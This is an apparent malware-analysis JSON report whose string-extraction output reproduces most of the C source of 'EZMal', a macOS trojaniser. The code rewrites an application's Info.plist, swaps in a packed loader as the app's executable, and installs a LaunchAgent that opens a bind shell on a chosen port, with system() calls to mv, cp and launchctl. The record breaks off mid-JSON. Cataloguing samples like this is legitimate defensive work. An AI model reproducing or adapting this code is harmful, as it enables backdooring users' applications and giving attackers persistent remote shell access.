{
    "filepath": "/home/chris/data/rpe005/malware_samples_exercise/20190522_112322_rpe005_malware_alert_folders/interdependable7rVTYTavxNcfkSNbaSHovYVZ1JBny9Ni1uXOdR6akXN9rZOboDYJdEFNnxLUTJsW/ef8bdf368eb7472aaf4c012aa75b90c81ebe8cf2c8f1aa6a8c3b66ac3d7d3f82/dcfdd8f1fe16a366974df00862987aebfc497a3c412e2bdc9f3d987adc7377f9",
    "fileinfo": {
        "labels": {
            "family": "bad_sample_5_folders",
            "software": "test_file"
        },
        "md5": "0a659764da5ddd4014f89aa15240cf14",
        "type": "C source, ASCII text",
        "clamav": "OK",
        "blobs": "Extracted 1 blobs (1 C)"
    },
    "plugins": [
        {
            "plugin": "extractors.disassembly",
            "version": "0.1",
            "results": {}
        },
        {
            "plugin": "extractors.strings",
            "version": "0.1",
            "results": {
                "#include <stdio.h>": 1,
                "#include <stdlib.h>": 1,
                "#include <setjmp.h>": 1,
                "#include <string.h>": 1,
                "#include <errno.h>": 1,
                "#include <unistd.h>": 1,
                "#include <ctype.h>": 1,
                "#include <sys/types.h>": 1,
                "#include <sys/stat.h>": 1,
                "#include <netdb.h>": 1,
                "#include <arpa/inet.h>": 1,
                "#include \"common.h\"": 1,
                "/* splash */": 1,
                "void logo(void) {": 1,
                "printf(\"\\x1b[90m   .-------. \\n\")": 1,
                "printf(\"  /         \\\\ \\n\")": 1,
                "printf(\" | )(\\x1b[91m.\\x1b[90m\\\\ /\\x1b[91m.\\x1b[90m)( |\\n\")": 2,
                "printf(\" |/_  /_\\\\  _\\\\|\\n\")": 1,
                "printf(\" '._       _.'\\n\")": 1,
                "printf(\"   |i\\x1b[97muuuuu\\x1b[90mi|\\n\")": 1,
                "printf(\"   \\\\'\\x1b[97m-----\\x1b[90m'/\\n\")": 1,
                "printf(\"    '-----'\\n\")": 1,
                "printf(\" \\x1b[92m ____    _____\\n\")": 1,
                "printf(\" \\x1b[92m/ __/   /__  /\\n\")": 1,
                "printf(\" \\x1b[97m\\\\ \\\\  \\x1b[91mEZY\\x1b[97m  / /\\n\")": 1,
                "printf(\" \\x1b[97m/ /_ \\x1b[91mMAL\\x1b[97m / /__\\n\")": 1,
                "printf(\" \\x1b[92m\\\\___\\\\   /____/\\x1b[0m\\n\")": 1,
                "printf(\"\\n(C) microphone8000 <mic8000@softhome.net> 2k8\\n\")": 1,
                "printf(\"\\nWARNING: THIS PROGRAM IS FOR 'INFORMATIONAL' PURPOSES ONLY\\n\")": 1,
                "/* atexit/setjmp */": 1,
                "void unload(void) {": 1,
                "printf(\"\\nu \\x1b[92mph33r\\x1b[0m it, don't u...\\n\")": 1,
                "jmp_buf cancelCmdBuf": 1,
                "void cancelCmd(void) {": 1,
                "longjmp(cancelCmdBuf, 1)": 1,
                "/* Buffer size */": 1,
                "#define BUF_SIZE": 1,
                "/* Packed data */": 1,
                "#include \"pack.c\"": 1,
                "#include \"bindshell.h\"": 1,
                "#include \"loader.data\"": 1,
                "char *cu[BUF_SIZE]": 1,
                "void doCU(void) {": 1,
                "for (i = 0": 10,
                "i < BUF_SIZE": 3,
                "i++) {": 4,
                "if (cu[i] == NULL)": 1,
                "continue": 2,
                "if (unlink(cu[i]) == -1) {": 1,
                "printf(\"\\x1b[91mDelete of '%s' failed: %s\\x1b[0m\\n\",": 1,
                "cu[i], strerror(errno)": 1,
                "cancelCmd()": 17,
                "} else {": 2,
                "printf(\"\\x1b[96m--[ \\x1b[90mDeleted: \\x1b[91m%s \\x1b[96m]--\\x1b[0mn\\n\", cu[i])": 1,
                "void initCU(void) {": 1,
                "cu[i] = NULL": 1,
                "atexit(doCU)": 1,
                "void addCU(char *fn) {": 1,
                "if (cu[i] == NULL) {": 1,
                "cu[i] = fn": 1,
                "return": 7,
                "printf(\"\\x1b[91mNot enough cleanup entries left to add '%s'. run 'cleanup' du0d\\x1b[0m\\n\", fn)": 1,
                "/* Input/string ops */": 1,
                "void gets2(char const * const prompt, char *buf) {": 1,
                "printf(\"%s\", prompt)": 1,
                "fgets(buf, BUF_SIZE - 1, stdin)": 2,
                "if (strlen(buf) == 0)": 3,
                "buf[strlen(buf) - 1] = '\\0'": 4,
                "void cmdInput(char const * const msg, char *buf) {": 1,
                "printf(\"%s (leave blank to cancel): \", msg)": 1,
                "/* Parameters */": 1,
                "char app[BUF_SIZE]": 1,
                "char servName[BUF_SIZE]": 1,
                "char plist[BUF_SIZE]": 1,
                "void updatePList(void) {": 1,
                "snprintf(plist, BUF_SIZE - 1, bindshell_data,": 1,
                "PLIST_NAME,": 1,
                "servName": 1,
                "int isSet(char *p) {": 1,
                "return strcmp(p, \"\")": 1,
                "char paramStrRet[BUF_SIZE]": 1,
                "char *paramStr(char *pval) {": 1,
                "if (!isSet(pval))": 1,
                "strncpy(paramStrRet, \"<not set>\", BUF_SIZE - 1)": 1,
                "strncpy(paramStrRet, pval, BUF_SIZE - 1)": 1,
                "return paramStrRet": 1,
                "void params(void) {": 1,
                "printf(\"\\x1b[96mTrojan parameters:\\n\")": 1,
                "printf(\"\\x1b[94mApplication name: \\x1b[36m%s\\x1b[0m\\n\", paramStr(app))": 1,
                "struct servent *serv = getservbyname(servName, \"tcp\")": 1,
                "printf(\"\\x1b[94mBind shell service name: \\x1b[36m%s (%d)\\x1b[0m\\n\",": 1,
                "paramStr(servName),": 1,
                "(serv != NULL ? ntohs(serv->s_port) : 0)": 1,
                "/* Commands  */": 1,
                "void done(void) {": 1,
                "printf(\"\\n\\x1b[96m--[ \\x1b[90mDone \\x1b[96m]--\\x1b[0m\\n\\n\")": 1,
                "struct cmd_t {": 1,
                "char const * const name": 1,
                "char const * const desc": 2,
                "void (*f)(void)": 2,
                "void help(void)": 2,
                "void setApp(void) {": 1,
                "char val[BUF_SIZE]": 2,
                "while (1) {": 2,
                "cmdInput(\"e.g. for TextEdit.app enter 'TextEdit'.\\nName of application\", val)": 1,
                "i < strlen(val)": 2,
                "if (val[i] == '/') {": 1,
                "printf(\"app must be in current working directory\\n\")": 1,
                "if (i == strlen(val)) {": 1,
                "strncpy(app, val, BUF_SIZE - 1)": 1,
                "void setServ(void) {": 1,
                "struct servent *serv": 2,
                "cmdInput(\"Service name to bind shell to\", val)": 1,
                "serv = getservbyname(val, \"tcp\")": 2,
                "if (serv == NULL)": 1,
                "printf(\"THIS TIME PUT A VALID SERVICE IN PLZ\\n\")": 1,
                "else if (ntohs(serv->s_port) <= 1024) {": 1,
                "printf(\"service port must be > 1024\\n\")": 1,
                "strncpy(servName, val, BUF_SIZE - 1)": 1,
                "updatePList()": 2,
                "int find(char const * const haystack, char const * const needle, int n) {": 1,
                "i < n - strlen(needle)": 2,
                "if (memcmp(haystack + i, needle, strlen(needle)) == 0)": 1,
                "return i": 1,
                "return -1": 1,
                "#define FBUF_SIZE": 1,
                "1048576": 1,
                "char appExeName[FBUF_SIZE]": 1,
                "char *patchInfoPList(void) {": 1,
                "char fbuf[FBUF_SIZE]": 1,
                "int fsize": 2,
                "char fn[BUF_SIZE]": 2,
                "FILE *fp": 1,
                "printf(\"\\n\\x1b[96m--[ \\x1b[90mPatching Info.plist\\x1b[96m ]--\\x1b[0m\\n\")": 1,
                "snprintf(fn, BUF_SIZE - 1, \"%s.app/Contents/Info.plist\", app)": 1,
                "fp = fopen(fn, \"rb\")": 2,
                "if (fp == NULL) {": 2,
                "printf(\"\\x1b[31mFAILZ0r open of '%s'\\x1b[0m. aborting\\n\", fn)": 1,
                "fsize = fread(fbuf, 1, FBUF_SIZE - 1, fp)": 1,
                "if (fsize <= 0) {": 1,
                "printf(\"\\x1b[31mFAILZ0r read from '%s'\\x1b[0m. aborting\\n\", fn)": 1,
                "if (!feof(fp)) {": 1,
                "printf(\"\\x1b[31mfile buffer to small.. how fucking big iz ur Info.plist??\\x1b[0m. aborting\\n\")": 1,
                "fclose(fp)": 8,
                "char *cfBundleExe = \"CFBundleExecutable\"": 1,
                "i = find(fbuf, cfBundleExe, fsize)": 1,
                "if (i == -1)  {": 1,
                "printf(\"\\x1b[31mCFBundleExecutable not found.. ur Info.plist is fux0red..\\x1b[0m. aborting\\n\")": 1,
                "char const * const sTag = \"<string>\"": 1,
                "j = find(&fbuf[i], sTag, fsize - i)": 1,
                "if (j == -1)  {": 1,
                "printf(\"\\x1b[31m<string> not found after CFBundleExecutable.. ur Info.plist is fux0red..\\x1b[0m. aborting\\n\")": 1,
                "j += i": 1,
                "j += strlen(sTag)": 1,
                "k = find(&fbuf[j], \"<\", fsize - j)": 2,
                "if (k == -1) {": 1,
                "printf(\"\\x1b[31m</string> not found after CFBundleExecutable.. ur Info.plist is fux0red..\\x1b[0m. aborting\\n\")": 1,
                "k += j": 1,
                "memcpy(appExeName, &fbuf[j], k - j)": 1,
                "appExeName[k - j] = '\\0'": 1,
                "if (strcmp(appExeName, \"1\") == 0) {": 1,
                "printf(\"\\x1b[31mduh this is already trojaned nub\\x1b[0m. aborting\\n\")": 1,
                "fp = fopen(fn, \"wb\")": 1,
                "printf(\"\\x1b[31mFAILZ0r open for write of '%s'\\x1b[0m. aborting\\n\", fn)": 1,
                "r = fwrite(fbuf, 1, j, fp)": 2,
                "if (r != j) {": 1,
                "printf(\"\\x1b[31mFAILZ0r write to '%s'\\x1b[0m. aborting. LOL I HOPE U BACKED UP UR EXE. U MAY FIND IT IZ.. BONERED\\n\", fn)": 2,
                "fprintf(fp, \"1\")": 1,
                "r = fwrite(&fbuf[k], 1, fsize - k, fp)": 2,
                "if (r != fsize - k) {": 1,
                "return appExeName": 1,
                "void unpackLoader(void) {": 1,
                "snprintf(fn, BUF_SIZE - 1, \"%s.app/Contents/MacOS/1\", app)": 1,
                "strcpy(loader_data + LDR_PATCH_OFS, plist)": 1,
                "unpack(fn, loader_data, loader_data_size)": 2,
                "if (chmod(fn, 0755) == -1) {": 1,
                "printf(\"couldn't make '%s' executable.. FAIL\\n\", fn)": 1,
                "void renameAppExe(char *appExeName) {": 1,
                "char src[BUF_SIZE]": 1,
                "char dst[BUF_SIZE]": 1,
                "char cmd[BUF_SIZE]": 3,
                "printf(\"\\n\\x1b[96m--[ \\x1b[90mRenaming application executable\\x1b[96m]--\\x1b[0m\\n\")": 1,
                "snprintf(src, BUF_SIZE - 1, \"%s.app/Contents/MacOS/%s\", app, appExeName)": 1,
                "snprintf(dst, BUF_SIZE - 1, \"%s.app/Contents/MacOS/2\", app)": 1,
                "snprintf(cmd, BUF_SIZE - 1, \"mv -f %s %s\", src, dst)": 1,
                "system(cmd)": 4,
                "void trojanise(void) {": 1,
                "if (!isSet(app)) {": 1,
                "printf(\"\\x1b[90mset a fukn app du0d!@@!\\x1b[0m\\n\")": 1,
                "if (!isSet(servName)) {": 1,
                "printf(\"\\x1b[90mset serv name plz..\\x1b[0m\\n\")": 1,
                "printf(\"\\x1b[96m--[ \\x1b[90mHACKING MODE: \\x1b[91m\\x1b[5mENGAGED\\x1b[0m \\x1b[96m]--\\x1b[0m\\n\")": 1,
                "char *appExeName": 1,
                "appExeName = patchInfoPList()": 1,
                "unpackLoader()": 1,
                "renameAppExe(appExeName)": 1,
                "void rmShell(void) {": 1,
                "printf(\"\\x1b[32mLAME\\x1b[0m\\n\")": 1,
                "snprintf(cmd, BUF_SIZE - 1, \"rm -f ~/Library/LaunchAgents/%s\", PLIST_NAME)": 1,
                "addCU(\"tmp.plist\")": 1,
                "unpack(\"tmp.plist\", plist, strlen(plist))": 2,
                "system(\"cp tmp.plist ~/Library/LaunchAgents\")": 1,
                "system(\"launchctl unload ~/Library/LaunchAgents\")": 1,
                "system(\"rm ~/Library/LaunchAgents/tmp.plist\")": 1,
                "system(\"launchctl load ~/Library/LaunchAgents\")": 1,
                "void doExit(void) {": 1,
                "exit(0)": 1,
                "struct cmd_t cmds[] = {": 1,
                "{\"help\", \"Display a list of commands.\", help},": 1,
                "{\"app\", \"Set target application.\", setApp},": 1,
                "{\"serv\", \"Service name from /etc/services (determines port).\", setServ},": 1,
                "{\"params\", \"Show parameters.\", params},": 1,
                "{\"rmshell\", \"Remove trojan from this account.\", rmShell},": 1,
                "{\"hack\", \"\\x1b[91mTR0JAN1ZE!!!@!@!\\x1b[0m\", trojanise},": 1,
                "{\"cleanup\", \"Delete unpacked files\", doCU},": 1,
                "{\"exit\", \"Terminate EZMal\", doExit},": 1,
                "{NULL, NULL, NULL}": 1,
                "void help(void) {": 1,
                "struct cmd_t *p": 3,
                "printf(\"\\x1b[90mCommands:\\n\")": 1,
                "for (p = cmds": 4,
                "p->name != NULL": 2,
                "printf(\"\\x1b[91m%s\\t\\t\\x1b[93m%s\\n\", p->name, p->desc)": 1,
                "printf(\"\\x1b[0m\")": 4,
                "/* Main loop */": 1,
                "void cmdLoop(void) {": 1,
                "setjmp(cancelCmdBuf)": 1,
                "while (!feof(stdin)) {": 1,
                "gets2(\"\\x1b[31m>>>\\x1b[32m\", cmd)": 1,
                "int found = 0": 2,
                "p++) {": 1,
                "if (strcmp(p->name, cmd))": 1,
                "printf(\"\\x1b[96m--[ \\x1b[90mCommand: \\x1b[91m%s \\x1b[96m]--\\x1b[0m\\n\\n\", cmd)": 1,
                "found = 1": 2,
                "p->f()": 2,
                "done()": 2,
                "if (!found)": 1,
                "printf(\"LOL WHAT??? \\x1b[93mNEWB\\n\\x1b[0m\")": 1,
                "int main(void) {": 1,
                "atexit(unload)": 1,
                "initCU()": 1,
                "logo()": 2,
                "cmdLoop()": 1,
                "return 0": 2,
                "word: include": 30,
                "word: stdlib": 2,
                "word: setjmp": 6,
                "word: string": 10,
                "word: unistd": 2,
                "word: common": 2,
                "word: splash": 2,
                "word: printf": 102,
                "word: muuuuu": 2,
                "word: microphone": 2,
                "word: softhome": 2,
                "word: nwarning": 2,
                "word: program": 2,
                "word: informational": 2,
                "word: purposes": 2,
                "word: atexit": 6,
                "word: unload": 6,
                "word: cancelcmdbuf": 6,
                "word: cancelcmd": 36,
                "word: longjmp": 2,
                "word: buffer": 4,
                "word: define": 4,
                "word: packed": 2,
                "word: bindshell": 4,
                "word: loader": 8,
                "word: continue": 4,
                "word: unlink": 2,
                "word: mdelete": 2,
                "word: failed": 2,
                "word: strerror": 2,
                "word: mdeleted": 2,
                "word: initcu": 4,
                "word: return": 20,
                "word: enough": 2,
                "word: cleanup": 6,
                "word: entries": 2,
                "word: prompt": 4,
                "word: strlen": 22,
                "word: cmdinput": 6,
                "word: cancel": 2,
                "word: parameters": 6,
                "word: servname": 12,
                "word: updateplist": 6,
                "word: snprintf": 14,
                "word: strcmp": 6,
                "word: paramstrret": 8,
                "word: paramstr": 6,
                "word: strncpy": 8,
                "word: params": 6,
                "word: mtrojan": 2,
                "word: mapplication": 2,
                "word: struct": 12,
                "word: servent": 4,
                "word: getservbyname": 4,
                "word: service": 10,
                "word: commands": 4,
                "word: setapp": 4,
                "word: textedit": 4,
                "word: application": 6,
                "word: current": 2,
                "word: working": 2,
                "word: directory": 2,
                "word: setserv": 4,
                "word: haystack": 4,
                "word: needle": 8,
                "word: memcmp": 2,
                "word: appexename": 20,
                "word: patchinfoplist": 4,
                "word: mpatching": 2,
                "word: contents": 8,
                "word: mfailz": 10,
                "word: aborting": 20,
                "word: fucking": 2,
                "word: fclose": 10,
                "word: cfbundleexe": 4,
                "word: cfbundleexecutable": 6,
                "word: mcfbundleexecutable": 2,
                "word: memcpy": 2,
                "word: already": 2,
                "word: trojaned": 2,
                "word: fwrite": 4,
                "word: backed": 4,
                "word: bonered": 4,
                "word: fprintf": 2,
                "word: unpackloader": 4,
                "word: strcpy": 2,
                "word: unpack": 4,
                "word: couldn": 2,
                "word: executable": 4,
                "word: renameappexe": 4,
                "word: mrenaming": 2,
                "word: system": 12,
                "word: trojanise": 4,
                "word: mhacking": 2,
                "word: mengaged": 2,
                "word: rmshell": 6,
                "word: library": 10,
                "word: launchagents": 10,
                "word: launchctl": 4,
                "word: doexit": 4,
                "word: display": 2,
                "word: target": 2,
                "word: services": 2,
                "word: determines": 2,
                "word: remove": 2,
                "word: trojan": 2,
                "word: account": 2,
                "word: delete": 2,
                "word: unpacked": 2,
                "word: terminate": 2,
                "word: mcommands": 2,
                "word: cmdloop": 4,
                "word: mcommand": 2,
                "special: stdio.h": 2,
                "special: stdlib.h": 2,
                "special: setjmp.h": 2,
                "special: string.h": 2,
                "special: errno.h": 2,
                "special: unistd.h": 2,
                "special: ctype.h": 2,
                "special: types.h": 2,
                "special: sys/types": 2,
                "special: stat.h": 2,
                "special: sys/stat": 2,
                "special: netdb.h": 2,
                "special: inet.h": 2,
                "special: arpa/inet": 2,
                "special: common.h": 2,
                "special: softhome.net": 2,
                "special: atexit/setjmp": 2,
                "special: pack.c": 2,
                "special: bindshell.h": 2,
                "special: loader.data": 2,
                "special: Input/string": 1,
                "special: e.g": 2,
                "special: TextEdit.app": 1,
                "special: Info.plist": 6,
                "special: s.app": 8,
                "special: app/Contents/Info": 1,
                "special: app/Contents/MacOS/1": 1,
                "special: app/Contents/MacOS": 1,
                "special: app/Contents/MacOS/2": 1,
                "special: Library/LaunchAgents": 4,
                "special: tmp.plist": 8,
                "special: Library/LaunchAgents/tmp": 1,
                "special: etc/services": 2,
                "#include <stdio.h> #include <stdlib.h> #include <setjmp.h> #include <string.h> #include <errno.h> #include <unistd.h> #include <ctype.h> #include <sys/types.h> #include <sys/stat.h> #include <netdb.h> #include <arpa/inet.h> #include \"common.h\" /* splash */ void logo(void) { printf(\"\\x1b[90m .-------. \\n\")": 1,
                "printf(\" / \\\\ \\n\")": 1,
                "printf(\" |/_ /_\\\\ _\\\\|\\n\")": 1,
                "printf(\" '._ _.'\\n\")": 1,
                "printf(\" |i\\x1b[97muuuuu\\x1b[90mi|\\n\")": 1,
                "printf(\" \\\\'\\x1b[97m-----\\x1b[90m'/\\n\")": 1,
                "printf(\" '-----'\\n\")": 1,
                "printf(\" \\x1b[92m ____ _____\\n\")": 1,
                "printf(\" \\x1b[92m/ __/ /__ /\\n\")": 1,
                "printf(\" \\x1b[97m\\\\ \\\\ \\x1b[91mezy\\x1b[97m / /\\n\")": 1,
                "printf(\" \\x1b[97m/ /_ \\x1b[91mmal\\x1b[97m / /__\\n\")": 1,
                "printf(\" \\x1b[92m\\\\___\\\\ /____/\\x1b[0m\\n\")": 1,
                "printf(\"\\n(c) microphone8000 <mic8000@softhome.net> 2k8\\n\")": 1,
                "printf(\"\\nwarning: this program is for 'informational' purposes only\\n\")": 1,
                "} /* atexit/setjmp */ void unload(void) { printf(\"\\nu \\x1b[92mph33r\\x1b[0m it, don't u...\\n\")": 1,
                "} jmp_buf cancelcmdbuf": 1,
                "void cancelcmd(void) { longjmp(cancelcmdbuf, 1)": 1,
                "} /* buffer size */ #define buf_size 10000 /* packed data */ #include \"pack.c\" #include \"bindshell.h\" #include \"loader.data\" char *cu[buf_size]": 1,
                "void docu(void) { int i": 1,
                "i < buf_size": 3,
                "i++) { if (cu[i] == null) continue": 1,
                "if (unlink(cu[i]) == -1) { printf(\"\\x1b[91mdelete of '%s' failed: %s\\x1b[0m\\n\", cu[i], strerror(errno) )": 1,
                "cancelcmd()": 15,
                "} else { printf(\"\\x1b[96m--[ \\x1b[90mdeleted: \\x1b[91m%s \\x1b[96m]--\\x1b[0mn\\n\", cu[i])": 1,
                "} } } void initcu(void) { int i": 1,
                "i++) cu[i] = null": 1,
                "atexit(docu)": 1,
                "} void addcu(char *fn) { int i": 1,
                "i++) { if (cu[i] == null) { cu[i] = fn": 1,
                "} } printf(\"\\x1b[91mnot enough cleanup entries left to add '%s'. run 'cleanup' du0d\\x1b[0m\\n\", fn)": 1,
                "} /* input/string ops */ void gets2(char const * const prompt, char *buf) { printf(\"%s\", prompt)": 1,
                "fgets(buf, buf_size - 1, stdin)": 2,
                "if (strlen(buf) == 0) return": 1,
                "} void cmdinput(char const * const msg, char *buf) { printf(\"%s (leave blank to cancel): \", msg)": 1,
                "if (strlen(buf) == 0) cancelcmd()": 2,
                "} /* parameters */ char app[buf_size]": 1,
                "char servname[buf_size]": 1,
                "char plist[buf_size]": 1,
                "void updateplist(void) { snprintf(plist, buf_size - 1, bindshell_data, plist_name, servname )": 1,
                "} int isset(char *p) { return strcmp(p, \"\")": 1,
                "} char paramstrret[buf_size]": 1,
                "char *paramstr(char *pval) { if (!isset(pval)) strncpy(paramstrret, \"<not set>\", buf_size - 1)": 1,
                "else strncpy(paramstrret, pval, buf_size - 1)": 1,
                "return paramstrret": 1,
                "} void params(void) { printf(\"\\x1b[96mtrojan parameters:\\n\")": 1,
                "printf(\"\\x1b[94mapplication name: \\x1b[36m%s\\x1b[0m\\n\", paramstr(app))": 1,
                "struct servent *serv = getservbyname(servname, \"tcp\")": 1,
                "printf(\"\\x1b[94mbind shell service name: \\x1b[36m%s (%d)\\x1b[0m\\n\", paramstr(servname), (serv != null ? ntohs(serv->s_port) : 0) )": 1,
                "} /* commands */ void done(void) { printf(\"\\n\\x1b[96m--[ \\x1b[90mdone \\x1b[96m]--\\x1b[0m\\n\\n\")": 1,
                "} struct cmd_t { char const * const name": 1,
                "void setapp(void) { char val[buf_size]": 1,
                "while (1) { cmdinput(\"e.g. for textedit.app enter 'textedit'.\\nname of application\", val)": 1,
                "i++) { if (val[i] == '/') { printf(\"app must be in current working directory\\n\")": 1,
                "} } if (i == strlen(val)) { strncpy(app, val, buf_size - 1)": 1,
                "} } } void setserv(void) { char val[buf_size]": 1,
                "while (1) { cmdinput(\"service name to bind shell to\", val)": 1,
                "if (serv == null) printf(\"this time put a valid service in plz\\n\")": 1,
                "else if (ntohs(serv->s_port) <= 1024) { printf(\"service port must be > 1024\\n\")": 1,
                "} else { strncpy(servname, val, buf_size - 1)": 1,
                "updateplist()": 2,
                "} } } int find(char const * const haystack, char const * const needle, int n) { int i": 1,
                "i++) { if (memcmp(haystack + i, needle, strlen(needle)) == 0) return i": 1,
                "} return -1": 1,
                "} #define fbuf_size 1048576 char appexename[fbuf_size]": 1,
                "char *patchinfoplist(void) { char fbuf[fbuf_size]": 1,
                "char fn[buf_size]": 1,
                "file *fp": 1,
                "printf(\"\\n\\x1b[96m--[ \\x1b[90mpatching info.plist\\x1b[96m ]--\\x1b[0m\\n\")": 1,
                "snprintf(fn, buf_size - 1, \"%s.app/contents/info.plist\", app)": 1,
                "if (fp == null) { printf(\"\\x1b[31mfailz0r open of '%s'\\x1b[0m. aborting\\n\", fn)": 1,
                "} fsize = fread(fbuf, 1, fbuf_size - 1, fp)": 1,
                "if (fsize <= 0) { printf(\"\\x1b[31mfailz0r read from '%s'\\x1b[0m. aborting\\n\", fn)": 1,
                "} if (!feof(fp)) { printf(\"\\x1b[31mfile buffer to small.. how fucking big iz ur info.plist??\\x1b[0m. aborting\\n\")": 1,
                "} fclose(fp)": 2,
                "char *cfbundleexe = \"cfbundleexecutable\"": 1,
                "i = find(fbuf, cfbundleexe, fsize)": 1,
                "if (i == -1) { printf(\"\\x1b[31mcfbundleexecutable not found.. ur info.plist is fux0red..\\x1b[0m. aborting\\n\")": 1,
                "} char const * const stag = \"<string>\"": 1,
                "j = find(&fbuf[i], stag, fsize - i)": 1,
                "if (j == -1) { printf(\"\\x1b[31m<string> not found after cfbundleexecutable.. ur info.plist is fux0red..\\x1b[0m. aborting\\n\")": 1,
                "} j += i": 1,
                "j += strlen(stag)": 1,
                "if (k == -1) { printf(\"\\x1b[31m</string> not found after cfbundleexecutable.. ur info.plist is fux0red..\\x1b[0m. aborting\\n\")": 1,
                "} k += j": 1,
                "memcpy(appexename, &fbuf[j], k - j)": 1,
                "appexename[k - j] = '\\0'": 1,
                "if (strcmp(appexename, \"1\") == 0) { printf(\"\\x1b[31mduh this is already trojaned nub\\x1b[0m. aborting\\n\")": 1,
                "} fp = fopen(fn, \"wb\")": 1,
                "if (fp == null) { printf(\"\\x1b[31mfailz0r open for write of '%s'\\x1b[0m. aborting\\n\", fn)": 1,
                "} int r": 1,
                "if (r != j) { printf(\"\\x1b[31mfailz0r write to '%s'\\x1b[0m. aborting. lol i hope u backed up ur exe. u may find it iz.. bonered\\n\", fn)": 1,
                "} fprintf(fp, \"1\")": 1,
                "if (r != fsize - k) { printf(\"\\x1b[31mfailz0r write to '%s'\\x1b[0m. aborting. lol i hope u backed up ur exe. u may find it iz.. bonered\\n\", fn)": 1,
                "return appexename": 1,
                "} void unpackloader(void) { char fn[buf_size]": 1,
                "snprintf(fn, buf_size - 1, \"%s.app/contents/macos/1\", app)": 1,
                "strcpy(loader_data + ldr_patch_ofs, plist)": 1,
                "if (chmod(fn, 0755) == -1) { printf(\"couldn't make '%s' executable.. fail\\n\", fn)": 1,
                "} } void renameappexe(char *appexename) { char src[buf_size]": 1,
                "char dst[buf_size]": 1,
                "char cmd[buf_size]": 2,
                "printf(\"\\n\\x1b[96m--[ \\x1b[90mrenaming application executable\\x1b[96m]--\\x1b[0m\\n\")": 1,
                "snprintf(src, buf_size - 1, \"%s.app/contents/macos/%s\", app, appexename)": 1,
                "snprintf(dst, buf_size - 1, \"%s.app/contents/macos/2\", app)": 1,
                "snprintf(cmd, buf_size - 1, \"mv -f %s %s\", src, dst)": 1,
                "} void trojanise(void) { if (!isset(app)) { printf(\"\\x1b[90mset a fukn app du0d!@@!\\x1b[0m\\n\")": 1,
                "} if (!isset(servname)) { printf(\"\\x1b[90mset serv name plz..\\x1b[0m\\n\")": 1,
                "} printf(\"\\x1b[96m--[ \\x1b[90mhacking mode: \\x1b[91m\\x1b[5mengaged\\x1b[0m \\x1b[96m]--\\x1b[0m\\n\")": 1,
                "char *appexename": 1,
                "appexename = patchinfoplist()": 1,
                "unpackloader()": 1,
                "renameappexe(appexename)": 1,
                "} void rmshell(void) { printf(\"\\x1b[32mlame\\x1b[0m\\n\")": 1,
                "snprintf(cmd, buf_size - 1, \"rm -f ~/library/launchagents/%s\", plist_name)": 1,
                "addcu(\"tmp.plist\")": 1,
                "system(\"cp tmp.plist ~/library/launchagents\")": 1,
                "system(\"launchctl unload ~/library/launchagents\")": 1,
                "system(\"rm ~/library/launchagents/tmp.plist\")": 1,
                "system(\"launchctl load ~/library/launchagents\")": 1,
                "} void doexit(void) { exit(0)": 1,
                "} struct cmd_t cmds[] = { {\"help\", \"display a list of commands.\", help}, {\"app\", \"set target application.\", setapp}, {\"serv\", \"service name from /etc/services (determines port).\", setserv}, {\"params\", \"show parameters.\", params}, {\"rmshell\", \"remove trojan from this account.\", rmshell}, {\"hack\", \"\\x1b[91mtr0jan1ze!!!@!@!\\x1b[0m\", trojanise}, {\"cleanup\", \"delete unpacked files\", docu}, {\"exit\", \"terminate ezmal\", doexit}, {null, null, null} }": 1,
                "void help(void) { struct cmd_t *p": 1,
                "printf(\"\\x1b[90mcommands:\\n\")": 1,
                "p->name != null": 2,
                "p++) printf(\"\\x1b[91m%s\\t\\t\\x1b[93m%s\\n\", p->name, p->desc)": 1,
                "} /* main loop */ void cmdloop(void) { char cmd[buf_size]": 1,
                "setjmp(cancelcmdbuf)": 1,
                "while (!feof(stdin)) { gets2(\"\\x1b[31m>>>\\x1b[32m\", cmd)": 1,
                "p++) { if (strcmp(p->name, cmd)) continue": 1,
                "printf(\"\\x1b[96m--[ \\x1b[90mcommand: \\x1b[91m%s \\x1b[96m]--\\x1b[0m\\n\\n\", cmd)": 1,
                "} if (!found) printf(\"lol what??? \\x1b[93mnewb\\n\\x1b[0m\")": 1,
                "} } int main(void) { atexit(unload)": 1,
                "initcu()": 1,
                "cmdloop()": 1,
                "special: textedit.app": 1,
                "special: info.plist": 6,
                "special: input/string": 1,
                "special: app/contents/info": 1,
                "special: app/contents/macos/1": 1,
                "special: app/contents/macos": 1,
                "special: app/contents/macos/2": 1,
                "special: library/launchagents": 4,
                "special: library/launchagents/tmp": 1
            }
        },
        {
            "plugin": "extractors.meta",
            "version": "0.1",
            "results": {
                "clamav: Cannot dlopen libclamunrar_iface: file not found - unrar support unavailable": 1,
                "clamav: cli_loadftm: File type signature for Microsoft Windows Shortcut File not loaded (required f-level: 1??)": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 7?? bytes": 1,
                "clamav: bytecode self test running": 1,
                "clamav: Bytecode 4?????????: executing in JIT mode": 1,
                "clamav: bytecode finished in 1 us": 1,
                "clamav: bytecode self test succeeded": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 1????? bytes": 1,
                "clamav: Bytecode: 94 bytecode prepared with JIT": 1,
                "clamav: Recognized ASCII text": 1,
                "clamav: cli_magic_scandesc: returning 0  at line 2???": 1,
                "clamav: malware family: OK": 1,
                "clamav: OK": 1,
                "clamav: Scanned files: 1": 1,
                "clamav: Infected files: 0": 1,
                "clamav: extracted blobs": 1,
                "clamav: extracted 1 blobs": 1,
                "clamav: blob size: 8???": 1,
                "clamav: Cannot dlopen libclamunrar_iface: file not found - unrar support unavailable;clamav: cli_loadftm: File type signature for Microsoft Windows Shortcut File not loaded (required f-level: 1??)": 1,
                "clamav: cli_loadftm: File type signature for Microsoft Windows Shortcut File not loaded (required f-level: 1??);clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 7?? bytes": 1,
                "clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 7?? bytes;clamav: bytecode self test running": 1,
                "clamav: bytecode self test running;clamav: Bytecode 4?????????: executing in JIT mode": 1,
                "clamav: Bytecode 4?????????: executing in JIT mode;clamav: bytecode finished in 1 us": 1,
                "clamav: bytecode finished in 1 us;clamav: bytecode self test succeeded": 1,
                "clamav: bytecode self test succeeded;clamav: [Bytecode JIT]; emitted ELF64-x86-64 <in-memory object> of 1????? bytes": 1,
